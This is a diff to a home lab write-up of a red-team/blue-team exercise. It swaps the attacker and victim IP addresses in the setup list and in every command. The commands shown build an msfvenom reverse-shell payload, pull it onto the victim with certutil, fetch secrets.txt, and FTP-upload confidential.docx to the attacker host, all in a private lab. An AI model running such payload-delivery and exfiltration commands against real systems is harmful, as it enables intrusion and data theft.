@@ -11,8 +11,8 @@ I acted as both:
 ---
 
 ## 🖥️ Lab Setup
-- **Attacker:** Kali Linux (`192.168.2.129`)
-- **Victim:** Windows 10 FLARE VM (`192.168.2.131`)
+- **Attacker:** Kali Linux (`192.168.2.131`)
+- **Victim:** Windows 10 FLARE VM (`192.168.2.129`)
 - **Sniffer/Analyst:** Wireshark/tcpdump (ran on Kali or Security Onion)
 - **Network:** VirtualBox Host-Only Network
 
@@ -32,11 +32,11 @@ I acted as both:
 - **Red Team Action:**  
   - Generated payload with `msfvenom`:
     ```bash
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.129 LPORT=4444 -f exe -o payload.exe
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.131 LPORT=4444 -f exe -o payload.exe
     ```
   - Delivered via `certutil`:
     ```cmd
-    certutil -urlcache -split -f http://192.168.2.129:8080/payload.exe payload.exe
+    certutil -urlcache -split -f http://192.168.2.131:8080/payload.exe payload.exe
     ```
   - Executed on victim to initiate a reverse shell back to attacker.
 
@@ -55,7 +55,7 @@ I acted as both:
 - **Red Team Action:**
   - Used built-in `certutil` to simulate data theft:
     ```cmd
-    certutil -urlcache -split -f http://192.168.2.129:8080/secrets.txt
+    certutil -urlcache -split -f http://192.168.2.131:8080/secrets.txt
     ```
   - File contents were sent/downloaded via HTTP.
 
@@ -104,7 +104,7 @@ I acted as both:
 - **Red Team Action:**
   - Used Windows built-in `ftp` client to upload a file to attacker server:
     ```cmd
-    ftp 192.168.2.129
+    ftp 192.168.2.131
     put confidential.docx
     ```
 
